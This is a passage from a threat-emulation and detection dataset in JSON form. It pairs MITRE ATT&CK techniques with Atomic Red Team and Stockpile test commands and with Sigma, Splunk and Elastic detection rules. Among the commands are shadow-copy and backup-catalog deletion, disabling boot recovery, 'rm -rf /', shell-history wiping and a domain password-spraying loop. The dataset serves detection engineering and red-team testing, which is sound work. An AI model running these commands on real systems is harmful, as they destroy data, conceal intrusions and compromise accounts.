\"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Certutil Command\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(* \\\\-decode * * \\\\/decode * * \\\\-decodehex * * \\\\/decodehex * * \\\\-urlcache * * \\\\/urlcache * * \\\\-verifyctl * * \\\\/verifyctl * * \\\\-encode * * \\\\/encode * *certutil* \\\\-URL* *certutil* \\\\/URL* *certutil* \\\\-ping* *certutil* \\\\/ping*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"* -decode *\" OR CommandLine=\"* /decode *\" OR CommandLine=\"* -decodehex *\" OR CommandLine=\"* /decodehex *\" OR CommandLine=\"* -urlcache *\" OR CommandLine=\"* /urlcache *\" OR CommandLine=\"* -verifyctl *\" OR CommandLine=\"* /verifyctl *\" OR CommandLine=\"* -encode *\" OR CommandLine=\"* /encode *\" OR CommandLine=\"*certutil* -URL*\" OR CommandLine=\"*certutil* /URL*\" OR CommandLine=\"*certutil* -ping*\" OR CommandLine=\"*certutil* /ping*\") | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"* -decode *\", \"* /decode *\", \"* -decodehex *\", \"* /decodehex *\", \"* -urlcache *\", \"* /urlcache *\", \"* -verifyctl *\", \"* /verifyctl *\", \"* -encode *\", \"* /encode *\", \"*certutil* -URL*\", \"*certutil* /URL*\", \"*certutil* -ping*\", \"*certutil* /ping*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.* -decode .*|.*.* /decode .*|.*.* -decodehex .*|.*.* /decodehex .*|.*.* -urlcache .*|.*.* /urlcache .*|.*.* -verifyctl .*|.*.* /verifyctl .*|.*.* -encode .*|.*.* /encode .*|.*.*certutil.* -URL.*|.*.*certutil.* /URL.*|.*.*certutil.* -ping.*|.*.*certutil.* /ping.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Malicious payload download via Office binaries\nid: 0c79148b-118e-472b-bdb7-9b57b444cc19\nstatus: experimental\ndescription: Downloads payload from remote server\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Powerpnt.yml\n    - https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191\n    - Reegun J (OCBC Bank)\nauthor: Beyu Denis, oscd.community\ndate: 2019/10/26\nmodified: 2019/11/04\ntags:\n    - attack.command_and_control\n    - attack.t1105\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: \n            - '\\powerpnt.exe'\n            - '\\winword.exe'\n            - '\\excel.exe'\n        CommandLine|contains: 'http'\n    condition: selection\nfalsepositives:\n    - Unknown", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Malicious payload download via Office binaries\nid: 0c79148b-118e-472b-bdb7-9b57b444cc19\nstatus: experimental\ndescription: Downloads payload from remote server\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Powerpnt.yml\n    - https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191\n    - Reegun J (OCBC Bank)\nauthor: Beyu Denis, oscd.community\ndate: 2019/10/26\nmodified: 2019/11/04\ntags:\n    - attack.command_and_control\n    - attack.t1105\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: \n            - '\\powerpnt.exe'\n            - '\\winword.exe'\n            - '\\excel.exe'\n        CommandLine|contains: 'http'\n    condition: selection\nfalsepositives:\n    - Unknown", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:(*\\\\\\\\powerpnt.exe OR *\\\\\\\\winword.exe OR *\\\\\\\\excel.exe) AND CommandLine.keyword:*http*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Malicious-payload-download-via-Office-binaries <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Malicious payload download via Office binaries\",\\n    \"description\": \"Downloads payload from remote server\",\\n    \"tags\": [\\n      \"attack.command_and_control\",\\n      \"attack.t1105\"\\n    ],\\n    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\powerpnt.exe OR *\\\\\\\\\\\\\\\\winword.exe OR *\\\\\\\\\\\\\\\\excel.exe) AND CommandLine.keyword:*http*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\powerpnt.exe OR *\\\\\\\\\\\\\\\\winword.exe OR *\\\\\\\\\\\\\\\\excel.exe) AND CommandLine.keyword:*http*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Malicious payload download via Office binaries\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:(*\\\\\\\\powerpnt.exe *\\\\\\\\winword.exe *\\\\\\\\excel.exe) AND CommandLine.keyword:*http*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\powerpnt.exe\" OR Image=\"*\\\\\\\\winword.exe\" OR Image=\"*\\\\\\\\excel.exe\") CommandLine=\"*http*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image IN [\"*\\\\\\\\powerpnt.exe\", \"*\\\\\\\\winword.exe\", \"*\\\\\\\\excel.exe\"] CommandLine=\"*http*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\powerpnt\\\\.exe|.*.*\\\\winword\\\\.exe|.*.*\\\\excel\\\\.exe))(?=.*.*http.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "ET ATTACK\\_RESPONSE Possible Lateral Movement - File Creation Request in Remote System32 Directory", "product": "Suricata (NSM)", "name": "ET Open Rule"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1107/T1107.yaml", "command": "rm -f /tmp/victim-files/a\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "rm -rf /tmp/victim-files\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "shred -u /tmp/victim-shred.txt\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "echo \"T1107\" > %temp%\\T1107.txt\ndel /f  %temp%\\T1107.txt >nul 2>&1\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "mkdir %temp%\\T1107\nrmdir /s /q %temp%\\T1107\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "New-Item $env:TEMP\\T1107.txt\nRemove-Item -path $env:TEMP\\T1107.txt\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "New-Item $env:TEMP\\T1107 -ItemType Directory\nRemove-Item -path $env:TEMP\\T1107 -recurse\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "vssadmin.exe Delete Shadows /All /Quiet\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "wmic shadowcopy delete\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "bcdedit /set {default} bootstatuspolicy ignoreallfailures\nbcdedit /set {default} recoveryenabled no\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "wbadmin delete catalog -quiet\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "rm -rf / --no-preserve-root > /dev/null 2> /dev/null\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "if ($env:os -eq \"Windows_NT\") {\n  New-Item $env:TEMP\\TeamViewer_54.log\n  Remove-Item $env:TEMP\\TeamViewer_54.log\n} else {\n  New-Item $env:HOME\\TeamViewer_54.log\n  Remove-Item $env:HOME\\TeamViewer_54.log\n}\n", "name": null}, {"source": "data/abilities/defense-evasion/43b3754c-def4-4699-a673-1d85648fda6a.yml", "command": {"windows": {"psh": {"command": "Clear-History;Clear"}}, "darwin": {"sh": {"command": "> $HOME/.bash_history && unset HISTFILE\n"}}, "linux": {"sh": {"command": "> $HOME/.bash_history && unset HISTFILE\n"}}}, "name": "Stop terminal from logging history"}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "rm -rf test1.text", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "rm -f test1.txt", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "shred -u test1.txt", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}], "command_list": ["rm -f /tmp/victim-files/a\n", "rm -rf /tmp/victim-files\n", "shred -u /tmp/victim-shred.txt\n", "echo \"T1107\" > %temp%\\T1107.txt\ndel /f  %temp%\\T1107.txt >nul 2>&1\n", "mkdir %temp%\\T1107\nrmdir /s /q %temp%\\T1107\n", "New-Item $env:TEMP\\T1107.txt\nRemove-Item -path $env:TEMP\\T1107.txt\n", "New-Item $env:TEMP\\T1107 -ItemType Directory\nRemove-Item -path $env:TEMP\\T1107 -recurse\n", "vssadmin.exe Delete Shadows /All /Quiet\n", "wmic shadowcopy delete\n", "bcdedit /set {default} bootstatuspolicy ignoreallfailures\nbcdedit /set {default} recoveryenabled no\n", "wbadmin delete catalog -quiet\n", "rm -rf / --no-preserve-root > /dev/null 2> /dev/null\n", "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])\n", "if ($env:os -eq \"Windows_NT\") {\n  New-Item $env:TEMP\\TeamViewer_54.log\n  Remove-Item $env:TEMP\\TeamViewer_54.log\n} else {\n  New-Item $env:HOME\\TeamViewer_54.log\n  Remove-Item $env:HOME\\TeamViewer_54.log\n}\n", {"windows": {"psh": {"command": "Clear-History;Clear"}}, "darwin": {"sh": {"command": "> $HOME/.bash_history && unset HISTFILE\n"}}, "linux": {"sh": {"command": "> $HOME/.bash_history && unset HISTFILE\n"}}}, "```", "rm -rf test1.text", "```", "```", "rm -f test1.txt", "```", "```", "shred -u test1.txt", "```"], "technique_id": "T1107", "parsed_datasets": [{"Atomic Red Team Test - File Deletion": {"display_name": "File Deletion", "atomic_tests": [{"description": "Delete a single file from the temporary directory\n", "supported_platforms": ["linux", "macos"], "name": "Delete a single file - Linux/macOS", "input_arguments": {"file_to_delete": {"default": "/tmp/victim-files/a", "type": "Path", "description": "Path of file to delete"}}, "executor": {"command": "rm -f #{file_to_delete}\n", "name": "sh"}}, {"description": "Recursively delete the temporary directory and all files contained within it\n", "supported_platforms": ["linux", "macos"], "name": "Delete an entire folder - Linux/macOS", "input_arguments": {"folder_to_delete": {"default": "/tmp/victim-files", "type": "Path", "description": "Path of folder to delete"}}, "executor": {"command": "rm -rf #{folder_to_delete}\n", "name": "sh"}}, {"description": "Use the `shred` command to overwrite the temporary file and then delete it\n", "supported_platforms": ["linux"], "name": "Overwrite and delete a file with shred", "input_arguments": {"file_to_shred": {"default": "/tmp/victim-shred.txt", "type": "Path", "description": "Path of file to shred"}}, "executor": {"command": "shred -u #{file_to_shred}\n", "name": "sh"}}, {"description": "Delete a single file from the temporary directory using cmd.exe\n", "supported_platforms": ["windows"], "name": "Delete a single file - Windows cmd", "executor": {"elevation_required": false, "command": "echo \"T1107\" > %temp%\\T1107.txt\ndel /f  %temp%\\T1107.txt >nul 2>&1\n", "name": "command_prompt"}}, {"description": "Recursively delete the temporary directory and all files contained within it using cmd.exe\n", "supported_platforms": ["windows"], "name": "Delete an entire folder - Windows cmd", "executor": {"elevation_required": false, "command": "mkdir %temp%\\T1107\nrmdir /s /q %temp%\\T1107\n", "name": "command_prompt"}}, {"description": "Delete a single file from the temporary directory using Powershell\n", "supported_platforms": ["windows"], "name": "Delete a single file - Windows PowerShell", "executor": {"elevation_required": false, "command": "New-Item $env:TEMP\\T1107.txt\nRemove-Item -path $env:TEMP\\T1107.txt\n", "name": "powershell"}}, {"description": "Recursively delete the temporary directory and all files contained within it using Powershell\n", "supported_platforms": ["windows"], "name": "Delete an entire folder - Windows PowerShell", "input_arguments": {"folder_to_delete": {"default": "C:\\Windows\\Temp\\victim-files-ps", "type": "Path", "description": "Path of folder to delete"}}, "executor": {"elevation_required": false, "command": "New-Item $env:TEMP\\T1107 -ItemType Directory\nRemove-Item -path $env:TEMP\\T1107 -recurse\n", "name": "powershell"}}, {"description": "Delete all volume shadow copies with vssadmin.exe\n", "supported_platforms": ["windows"], "name": "Delete VSS - vssadmin", "executor": {"elevation_required": true, "command": "vssadmin.exe Delete Shadows /All /Quiet\n", "name": "command_prompt"}}, {"description": "Delete all volume shadow copies with wmic\n", "supported_platforms": ["windows"], "name": "Delete VSS - wmic", "executor": {"elevation_required": true, "command": "wmic shadowcopy delete\n", "name": "command_prompt"}}, {"description": "This test leverages `bcdedit` to remove boot-time recovery measures.\n", "supported_platforms": ["windows"], "name": "bcdedit", "executor": {"elevation_required": true, "command": "bcdedit /set {default} bootstatuspolicy ignoreallfailures\nbcdedit /set {default} recoveryenabled no\n", "name": "command_prompt"}}, {"description": "This test deletes Windows Backup catalogs.\n", "supported_platforms": ["windows"], "name": "wbadmin", "executor": {"elevation_required": true, "command": "wbadmin delete catalog -quiet\n", "name": "command_prompt"}}, {"description": "This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.\n", "supported_platforms": ["linux"], "name": "Delete Filesystem - Linux", "executor": {"command": "rm -rf / --no-preserve-root > /dev/null 2> /dev/null\n", "name": "bash"}}, {"description": "Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique.\n", "supported_platforms": ["windows"], "name": "Delete-PrefetchFile", "executor": {"elevation_required": true, "command": "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])\n", "name": "powershell"}}, {"description": "Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.\nThis test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer\nlog file format of TeamViewerXX_Logfile.log\nhttps://twitter.com/SBousseaden/status/1197524463304290305?s=20\n", "supported_platforms": ["windows", "macos"], "name": "Delete TeamViewer Log Files", "executor": {"elevation_required": false, "command": "if ($env:os -eq \"Windows_NT\") {\n  New-Item $env:TEMP\\TeamViewer_54.log\n  Remove-Item $env:TEMP\\TeamViewer_54.log\n} else {\n  New-Item $env:HOME\\TeamViewer_54.log\n  Remove-Item $env:HOME\\TeamViewer_54.log\n}\n", "name": "powershell"}}], "attack_technique": "T1107"}}, {"Mitre Stockpile - Stop terminal from logging history": {"platforms": {"windows": {"psh": {"command": "Clear-History;Clear"}}, "darwin": {"sh": {"command": "> $HOME/.bash_history && unset HISTFILE\n"}}, "linux": {"sh": {"command": "> $HOME/.bash_history && unset HISTFILE\n"}}}, "description": "Stop terminal from logging history", "tactic": "defense-evasion", "technique": {"attack_id": "T1107", "name": "File Deletion"}, "id": "43b3754c-def4-4699-a673-1d85648fda6a", "name": "Avoid logs"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_command_line contains \"*remove-item*\"or process_command_line contains \"vssadmin*Delete Shadows /All /Q*\"or process_command_line contains \"*wmic*shadowcopy delete*\"or process_command_line contains \"*wbdadmin* delete catalog -q*\"or process_command_line contains \"*bcdedit*bootstatuspolicy ignoreallfailures*\"or process_command_line contains \"*bcdedit*recoveryenabled no*\")", "product": "Azure Sentinel", "name": "File Deletion"}, {"query": "title: Backup Catalog Deleted\nid: 9703792d-fd9a-456d-a672-ff92efe4806a\nstatus: experimental\ndescription: Detects backup catalog deletions\nreferences:\n    - https://technet.microsoft.com/en-us/library/cc742154(v=ws.11).aspx\n    - https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100\nauthor: Florian Roth (rule), Tom U. @c_APT_ure (collection)\ntags:\n    - attack.defense_evasion\n    - attack.t1107\nlogsource:\n    product: windows\n    service: application\ndetection:\n    selection:\n        EventID: 524\n        Source: Backup\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Backup Catalog Deleted\nid: 9703792d-fd9a-456d-a672-ff92efe4806a\nstatus: experimental\ndescription: Detects backup catalog deletions\nreferences:\n    - https://technet.microsoft.com/en-us/library/cc742154(v=ws.11).aspx\n    - https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100\nauthor: Florian Roth (rule), Tom U. @c_APT_ure (collection)\ntags:\n    - attack.defense_evasion\n    - attack.t1107\nlogsource:\n    product: windows\n    service: application\ndetection:\n    selection:\n        EventID: 524\n        Source: Backup\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"524\" AND Source:\"Backup\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Backup-Catalog-Deleted <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Backup Catalog Deleted\",\\n    \"description\": \"Detects backup catalog deletions\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1107\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"524\\\\\" AND Source:\\\\\"Backup\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"524\\\\\" AND Source:\\\\\"Backup\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Backup Catalog Deleted\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"524\" AND Source:\"Backup\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"524\" Source=\"Backup\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"524\" Source=\"Backup\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*524)(?=.*Backup))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=linux_audit syscall=59 comm=shred | table host,auid,msg", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=linux_audit type=execve shred .bash_history | table host,msg,a0,a2", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=linux_audit syscall=263 | table host,auid,uid,eid,exe", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=linux_audit syscall=82 exe=/usr/bin/shred | table host,auid,uid,eid,exe", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "-a always,exit -F arch=b64 -S execve,execveat -F auid>=1000 -F auid!=-1 -F key=program_execution", "product": "Splunk", "name": null}, {"query": "-w /home/ec2-user/.bash_history -p rwa -k bash_history_changes", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=\"bash_history\" bash_command=\"rm *\"", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=\"bash_history\" bash_command=\"shred -u *\"", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}], "attack_paths": []}, {"commands": [{"source": "atomics/T1110/T1110.yaml", "command": "net user /domain > DomainUsers.txt\necho \"Password1\" >> #{input_file_passwords}\necho \"1q2w3e4r\" >> #{input_file_passwords}\necho \"Password!\" >> #{input_file_passwords}\n@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL\n", "name": null}, {"source": "atomics/T1110/T1110.yaml", "command": "net user /domain > DomainUsers.txt\necho \"Password1\" >> #{input_file_passwords}\necho \"1q2w3e4r\" >> #{input_file_passwords}\necho \"Password!\" >> #{input_file_passwords}\n@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:YOUR_COMPANY\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL\n", "name": null}, {"source": "atomics/T1110/T1110.yaml", "command": "net user /domain > #{input_file_users}\necho \"Password1\" >> #{input_file_passwords}\necho \"1q2w3e4r\" >> #{input_file_passwords}\necho \"Password!\" >> #{input_file_passwords}\n@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use \\\\COMPANYDC1\\IPC$ /user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\\\COMPANYDC1\\IPC$ > NUL\n", "name": null}, {"source": "atomics/T1110/T1110.yaml", "command": "net user /domain > #{input_file_users}\necho \"Password1\" >> passwords.txt\necho \"1q2w3e4r\" >> passwords.txt\necho \"Password!\" >> passwords.txt\n@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (passwords.txt) DO @net use \\\\COMPANYDC1\\IPC$ /user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\\\COMPANYDC1\\IPC$ > NUL\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/recon/get_sql_server_login_default_pw", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/recon/get_sql_server_login_default_pw", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/recon/http_login", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/recon/http_login", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/smbautobrute", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/smbautobrute", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/smbscanner", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/smbscanner", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Shell\nroot @ icbc: / hacker / mima # hydra -l root -P passwd.txt ssh: //192.168.159.132 -V\nHydra v9.0 (c) 2019 by van Hauser / THC - Please do not use in military or secret service organizations, or for illegal purposes.", "name": "Shell"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "auth.log", "name": "auth.log"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Log\nFailed password for root from 192.168.159.129 port 43728 ssh2", "name": "Log"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "audit.log", "name": "audit.log"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Log\ntype = USER_AUTH msg = audit (1572163129.581: 316): pid = 2165 uid = 0 auid = 4294967295 ses = 4294967295 msg = 'op = PAM: authentication acct = \"root\" exe = \"/ usr / sbin / sshd\" hostname = 192.168 .159.129 addr = 192.168.159.129 terminal = ssh res = failed '", "name": "Log"}], "command_list": ["net user /domain > DomainUsers.txt\necho \"Password1\" >> #{input_file_passwords}\necho \"1q2w3e4r\" >> #{input_file_passwords}\necho \"Password!\" >> #{input_file_passwords}\n@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL\n", "net user /domain > DomainUsers.txt\necho \"Password1\" >> #{input_file_passwords}\necho \"1q2w3e4r\" >> #{input_file_passwords}\necho \"Password!\" >> #{input_file_passwords}\n@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:YOUR_COMPANY\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL\n", "net user /domain > #{input_file_users}\necho \"Password1\" >> #{input_file_passwords}\necho \"1q2w3e4r\" >> #{input_file_passwords}\necho \"Password!\" >> #{input_file_passwords}\n@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use \\\\COMPANYDC1\\IPC$ /user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\\\COMPANYDC1\\IPC$ > NUL\n", "net user /domain > #{input_file_users}\necho \"Password1\" >> passwords.txt\necho \"1q2w3e4r\" >> passwords.txt\necho \"Password!\" >> passwords.txt\n@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (passwords.txt) DO @net use \\\\COMPANYDC1\\IPC$ /user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\\\COMPANYDC1\\IPC$ > NUL\n", "powershell/recon/get_sql_server_login_default_pw", "powershell/recon/get_sql_server_login_default_pw", "powershell/recon/http_login", 